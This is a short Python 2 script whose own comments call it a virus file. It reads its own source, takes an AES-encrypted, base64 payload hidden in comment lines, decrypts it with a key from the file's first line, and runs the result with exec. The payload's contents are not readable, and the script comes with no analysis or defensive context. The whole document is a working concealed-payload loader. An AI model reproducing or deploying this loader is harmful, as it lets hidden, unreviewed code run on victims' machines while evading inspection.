######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
print e
exec e

sys.exit('Good job!')
#Start payload
#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
#End payload